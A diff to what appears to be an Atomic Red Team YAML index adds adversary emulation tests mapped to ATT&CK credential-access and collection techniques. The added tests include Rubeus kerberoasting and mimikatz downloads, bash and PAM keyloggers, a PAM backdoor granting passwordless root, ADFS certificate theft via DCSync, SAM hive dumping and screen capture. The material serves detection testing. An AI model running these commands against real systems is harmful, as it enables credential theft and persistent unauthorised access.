@@ -240,7 +240,64 @@ credential-access:
       - Dan Nutting, @KerberToast
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1558.004
+    atomic_tests:
+    - name: Rubeus asreproast
+      auto_generated_guid: 615bd568-2859-41b5-9aed-61f6a88e48dd
+      description: |
+        Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
+        This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_folder:
+          description: Local path of Rubeus executable
+          type: Path
+          default: "$Env:temp"
+        local_executable:
+          description: name of the rubeus executable
+          type: String
+          default: rubeus.exe
+        out_file:
+          description: file where command results are stored
+          type: String
+          default: rubeus_output.txt
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      - description: 'Rubeus must exist
+
+'
+        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
+
+'
+      executor:
+        command: 'cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}"
+
+'
+        cleanup_command: 'Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: false
   T1552.003:
     technique:
       external_references:
@@ -1527,7 +1584,8 @@ credential-access:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -2014,7 +2072,8 @@ credential-access:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -2363,6 +2422,68 @@ credential-access:
           iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
           Invoke-Kerberoast | fl
         name: powershell
+    - name: Rubeus kerberoast
+      auto_generated_guid: 14625569-6def-4497-99ac-8e7817105b55
+      description: |
+        Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
+        This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_folder:
+          description: Local path of Rubeus executable
+          type: Path
+          default: "$Env:temp"
+        local_executable:
+          description: name of the rubeus executable
+          type: String
+          default: rubeus.exe
+        out_file:
+          description: file where command results are stored
+          type: String
+          default: rubeus_output.txt
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+        flags:
+          description: command flags you would like to run (optional and blank by
+            default)
+          type: String
+          default: 
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      - description: 'Rubeus must exist
+
+'
+        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
+
+'
+      executor:
+        command: 'cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags}
+          /outfile:"#{local_folder}\#{out_file}"
+
+'
+        cleanup_command: 'Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: false
   T1555.001:
     technique:
       created: '2020-02-12T18:55:24.728Z'
@@ -2567,6 +2688,148 @@ credential-access:
           sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
         name: sh
         elevation_required: true
+    - name: Logging bash history to syslog
+      auto_generated_guid: 0e59d59d-3265-4d35-bebd-bf5c1ec40db5
+      description: "There are several variables that can be set to control the appearance
+        of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents
+        of these variables are executed as if they had been typed on the command line.
+        The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable
+        and can be configured to write the latest \"bash history\" entries to the
+        syslog.\n\nTo gain persistence the command could be added to the users .bashrc
+        or .bash_aliases or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell and that logger
+          and tee are installed.
+
+'
+        prereq_command: |
+          if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
+          if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+          echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+          tail /var/log/syslog
+        cleanup_command: 'unset PROMPT_COMMAND
+
+'
+    - name: Bash session based keylogger
+      auto_generated_guid: 7f85a946-a0ea-48aa-b6ac-8ff539278258
+      description: "When a command is executed in bash, the BASH_COMMAND variable
+        contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\".
+        The trap command is not a external command, but a built-in function of bash
+        and can be used in a script to run a bash function when some event occurs.
+        trap will detect when the BASH_COMMAND variable value changes and then pipe
+        that value into a file, creating a bash session based keylogger. \n\nTo gain
+        persistence the command could be added to the users .bashrc or .bash_aliases
+        or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell
+
+'
+        prereq_command: 'if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n*****
+          Bash not running! *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        output_file:
+          name: output_file
+          description: File to store captured commands
+          type: String
+          default: "/tmp/.keyboard.log"
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
+          echo "Hello World!"
+          cat #{output_file}
+        cleanup_command: 'rm #{output_file}
+
+'
+    - name: SSHD PAM keylogger
+      auto_generated_guid: 81d7d2ad-d644-4b6a-bea7-28ffe43becca
+      description: 'Linux PAM (Pluggable Authentication Modules) is used in sshd authentication.
+        The Linux audit tool auditd can use the pam_tty_audit module to enable auditing
+        of TTY input and capture all keystrokes in a ssh session and place them in
+        the /var/log/audit/audit.log file after the session closes.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: |
+          if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        user_account:
+          description: Basic ssh user account for testing.
+          type: string
+          default: ubuntu
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "cp -v /etc/pam.d/sshd /tmp/\necho >> \"session required pam_tty_audit.so
+          disable=* enable=* open_only log_passwd\"\nsystemctl restart sshd\nsystemctl
+          restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n"
+        cleanup_command: 'cp -fv /tmp/sshd /etc/pam.d/
+
+'
+    - name: Auditd keylogger
+      auto_generated_guid: a668edb9-334e-48eb-8c2e-5413a40867af
+      description: "The linux audit tool auditd can be used to capture 32 and 64 bit
+        command execution and place the command in the /var/log/audit/audit.log audit
+        log. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: 'if [ ! -x "$(command -v auditd)" ]; then echo -e "\n*****
+          auditd NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        output_file:
+          description: description
+          type: type
+          default: default
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl
+          -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start
+          $(date +\"%d/%m/%y %H:%M:%S\") \n"
+        cleanup_command: 'systemctl restart auditd
+
+'
   T1557.001:
     technique:
       external_references:
@@ -3030,15 +3293,8 @@ credential-access:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
-          $request = [System.Net.WebRequest]::Create($url)
-          $response = $request.GetResponse()
-          $realTagUrl = $response.ResponseUri.OriginalString
-          $version = $realTagUrl.split('/')[-1]
-          $fileName = 'mimikatz_trunk.zip'
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $realDownloadUrl =$realTagUrl.Replace('tag','download') + '/' + $fileName
-          Invoke-WebRequest $realDownloadUrl -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -4892,7 +5148,100 @@ credential-access:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1556.003
+    atomic_tests:
+    - name: Malicious PAM rule
+      auto_generated_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+      description: |
+        Inserts a rule into a PAM config and then tests it.
+
+        Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient pam_succeed_if.so uid >= 0
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
+    - name: Malicious PAM module
+      auto_generated_guid: 65208808-3125-4a2e-8389-a0a00e9ab326
+      description: |
+        Creates a PAM module, inserts a rule to use it, and then tests it.
+
+        Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient /tmp/pam_evil.so
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+        path_to_pam_module_source:
+          description: Path to PAM module source code.
+          type: path
+          default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
+        path_to_pam_module:
+          description: Path to PAM module object
+          type: path
+          default: "/tmp/pam_evil.so"
+      dependencies:
+      - description: 'The PAM development library must be installed to build the PAM
+          module
+
+'
+        prereq_command: 'if [ -f /usr/include/security/pam_modules.h ]; then exit
+          0; else exit 1; fi;
+
+'
+        get_prereq_command: 'if [ -n "`which apt-get`" ]; then sudo apt-get -y install
+          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
+          fi
+
+'
+      - description: 'The PAM module must exist on disk at specified location (#{path_to_pam_module})
+
+'
+        prereq_command: 'if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1;
+          fi;
+
+'
+        get_prereq_command: 'sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
   T1552.004:
     technique:
       id: attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf
@@ -4988,9 +5337,9 @@ credential-access:
           type: path
           default: "/tmp/keyfile_locations.txt"
       executor:
-        command: |
-          find #{search_path} -name id_rsa >> #{output_file}
-          find #{search_path} -name id_dsa >> #{output_file}
+        command: 'find #{search_path} -name id_rsa >> #{output_file}
+
+'
         cleanup_command: 'rm #{output_file}
 
 '
@@ -5016,7 +5365,6 @@ credential-access:
         command: |
           mkdir #{output_folder}
           find #{search_path} -name id_rsa -exec cp --parents {} #{output_folder} \;
-          find #{search_path} -name id_dsa -exec cp --parents {} #{output_folder} \;
         cleanup_command: 'rm #{output_folder}
 
 '
@@ -5043,11 +5391,129 @@ credential-access:
         command: |
           mkdir #{output_folder}
           find #{search_path} -name id_rsa -exec rsync -R {} #{output_folder} \;
-          find #{search_path} -name id_dsa -exec rsync -R {} #{output_folder} \;
         cleanup_command: 'rm -rf #{output_folder}
 
 '
         name: sh
+    - name: Copy the users GnuPG directory with rsync
+      auto_generated_guid: 2a5a0601-f5fb-4e2e-aa09-73282ae6afca
+      description: 'Copy the users GnuPG (.gnupg) directory on a Mac or Linux system
+        to a staging folder using the `rsync` command.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        search_path:
+          description: Path where to start searching from
+          type: path
+          default: "/"
+        output_folder:
+          description: Output folder containing a copy of the .gnupg directory
+          type: path
+          default: "/tmp/GnuPG"
+      executor:
+        command: |
+          mkdir #{output_folder}
+          find #{search_path} -type d -name '.gnupg' -exec rsync -Rr {} #{output_folder} \;
+        cleanup_command: 'rm -rf #{output_folder}
+
+'
+        name: sh
+    - name: ADFS token signing and encryption certificates theft - Local
+      auto_generated_guid: 78e95057-d429-4e66-8f82-0f060c1ac96f
+      description: |
+        Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.
+        Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AADInternals module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AADInternals) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AADInternals -Force
+
+'
+      executor:
+        command: |
+          Import-Module AADInternals -Force
+          Export-AADIntADFSCertificates
+          Get-ChildItem | Where-Object {$_ -like "ADFS*"}
+          Write-Host "`nCertificates retrieved successfully"
+        cleanup_command: |
+          Remove-Item -Path ".\ADFS_encryption.pfx"
+          Remove-Item -Path ".\ADFS_signing.pfx"
+        name: powershell
+    - name: ADFS token signing and encryption certificates theft - Remote
+      auto_generated_guid: cab413d8-9e4a-4b8d-9b84-c985bd73a442
+      description: |
+        Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.
+        Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfs_service_account_name:
+          description: Name of the ADFS service account
+          type: String
+          default: adfs_svc
+        replication_user:
+          description: Username with replication rights. It can be the Domain Admin
+            running the script
+          type: String
+          default: Administrator
+        replication_password:
+          description: Password of replication_username
+          type: String
+          default: ReallyStrongPassword
+        adfs_server_name:
+          description: Name of an ADFS server
+          type: String
+          default: sts.contoso.com
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AADInternals and ActiveDirectory modules must be installed.
+
+'
+        prereq_command: 'if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable
+          -Name ActiveDirectory)) {echo 0} else {echo 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AADInternals -Force
+
+'
+      executor:
+        command: "Import-Module ActiveDirectory -Force \nImport-Module AADInternals
+          -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc
+          = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object
+          name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString
+          -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object
+          -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user},
+          $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash
+          = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential
+          -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration
+          -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get
+          certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group =
+          $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container
+          = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent
+          = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base
+          = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter
+          = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\")
+          | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"]
+          \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\")
+          | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne()
+          \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted
+          certificates from configuration and decrypt them\nExport-AADIntADFSCertificates
+          -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like
+          \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n"
+        cleanup_command: |
+          Remove-Item -Path ".\ADFS_encryption.pfx"
+          Remove-Item -Path ".\ADFS_signing.pfx"
+        name: powershell
   T1003.007:
     technique:
       external_references:
@@ -5416,6 +5882,75 @@ credential-access:
           Invoke-PowerDump
         name: powershell
         elevation_required: true
+    - name: dump volume shadow copy hives with certutil
+      auto_generated_guid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
+      description: |
+        Dump hives from volume shadow copies with the certutil utility
+        This can be done with a non-admin user account
+      supported_platforms:
+      - windows
+      input_arguments:
+        dump_path:
+          description: Path where the hive will be dumped
+          type: Path
+          default: "$ENV:temp"
+        target_hive:
+          description: Hive you wish to dump
+          type: String
+          default: SAM
+        dumped_hive:
+          description: Name of the dumped hive
+          type: String
+          default: myhive
+      executor:
+        command: |
+          write-host ""
+          $shadowlist = get-wmiobject win32_shadowcopy
+          $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}
+          $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]
+          $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"
+          certutil -f -v -encodehex $shadowpath #{dump_path}\#{dumped_hive} 2
+        name: powershell
+        elevation_required: false
+        cleanup_command: |
+          write-host ""
+          $toremove = #{dump_path} + "\" + '#{dumped_hive}'
+          rm $toremove
+    - name: dump volume shadow copy hives with System.IO.File
+      auto_generated_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
+      description: 'Dump hives from volume shadow copies with System.IO.File
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dump_path:
+          description: Path where the hive will be dumped
+          type: Path
+          default: "$ENV:temp"
+        target_hive:
+          description: Hive you wish to dump
+          type: String
+          default: SAM
+        dumped_hive:
+          description: Name of the dumped hive
+          type: String
+          default: myhive
+      executor:
+        command: |
+          write-host ""
+          $shadowlist = get-wmiobject win32_shadowcopy
+          $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}
+          $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]
+          $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"
+          $mydump = #{dump_path} + '\' + '#{dumped_hive}'
+          [System.IO.File]::Copy($shadowpath , $mydump)
+        name: powershell
+        elevation_required: false
+        cleanup_command: |-
+          write-host ""
+          $toremove = #{dump_path} + "\" + '#{dumped_hive}'
+          rm $toremove
   T1555.002:
     technique:
       external_references:
@@ -8025,6 +8560,148 @@ collection:
           sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
         name: sh
         elevation_required: true
+    - name: Logging bash history to syslog
+      auto_generated_guid: 0e59d59d-3265-4d35-bebd-bf5c1ec40db5
+      description: "There are several variables that can be set to control the appearance
+        of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents
+        of these variables are executed as if they had been typed on the command line.
+        The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable
+        and can be configured to write the latest \"bash history\" entries to the
+        syslog.\n\nTo gain persistence the command could be added to the users .bashrc
+        or .bash_aliases or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell and that logger
+          and tee are installed.
+
+'
+        prereq_command: |
+          if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
+          if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+          echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+          tail /var/log/syslog
+        cleanup_command: 'unset PROMPT_COMMAND
+
+'
+    - name: Bash session based keylogger
+      auto_generated_guid: 7f85a946-a0ea-48aa-b6ac-8ff539278258
+      description: "When a command is executed in bash, the BASH_COMMAND variable
+        contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\".
+        The trap command is not a external command, but a built-in function of bash
+        and can be used in a script to run a bash function when some event occurs.
+        trap will detect when the BASH_COMMAND variable value changes and then pipe
+        that value into a file, creating a bash session based keylogger. \n\nTo gain
+        persistence the command could be added to the users .bashrc or .bash_aliases
+        or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell
+
+'
+        prereq_command: 'if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n*****
+          Bash not running! *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        output_file:
+          name: output_file
+          description: File to store captured commands
+          type: String
+          default: "/tmp/.keyboard.log"
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
+          echo "Hello World!"
+          cat #{output_file}
+        cleanup_command: 'rm #{output_file}
+
+'
+    - name: SSHD PAM keylogger
+      auto_generated_guid: 81d7d2ad-d644-4b6a-bea7-28ffe43becca
+      description: 'Linux PAM (Pluggable Authentication Modules) is used in sshd authentication.
+        The Linux audit tool auditd can use the pam_tty_audit module to enable auditing
+        of TTY input and capture all keystrokes in a ssh session and place them in
+        the /var/log/audit/audit.log file after the session closes.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: |
+          if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        user_account:
+          description: Basic ssh user account for testing.
+          type: string
+          default: ubuntu
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "cp -v /etc/pam.d/sshd /tmp/\necho >> \"session required pam_tty_audit.so
+          disable=* enable=* open_only log_passwd\"\nsystemctl restart sshd\nsystemctl
+          restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n"
+        cleanup_command: 'cp -fv /tmp/sshd /etc/pam.d/
+
+'
+    - name: Auditd keylogger
+      auto_generated_guid: a668edb9-334e-48eb-8c2e-5413a40867af
+      description: "The linux audit tool auditd can be used to capture 32 and 64 bit
+        command execution and place the command in the /var/log/audit/audit.log audit
+        log. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: 'if [ ! -x "$(command -v auditd)" ]; then echo -e "\n*****
+          auditd NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        output_file:
+          description: description
+          type: type
+          default: default
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl
+          -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start
+          $(date +\"%d/%m/%y %H:%M:%S\") \n"
+        cleanup_command: 'systemctl restart auditd
+
+'
   T1557.001:
     technique:
       external_references:
@@ -8827,6 +9504,31 @@ collection:
         cleanup_command: 'rm #{output_file} -ErrorAction Ignore
 
 '
+    - name: Windows Screen Capture (CopyFromScreen)
+      auto_generated_guid: e9313014-985a-48ef-80d9-cde604ffc187
+      description: |
+        Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.
+
+        [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: Path
+          default: "$env:TEMP\\T1113.png"
+      executor:
+        command: |
+          Add-Type -AssemblyName System.Windows.Forms
+          $screen = [Windows.Forms.SystemInformation]::VirtualScreen
+          $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+          $graphic = [Drawing.Graphics]::FromImage($bitmap)
+          $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+          $bitmap.Save("#{output_file}")
+        cleanup_command: 'Remove-Item #{output_file} -ErrorAction Ignore
+
+'
+        name: powershell
   T1213.002:
     technique:
       external_references:
@@ -11635,6 +12337,23 @@ privilege-escalation:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
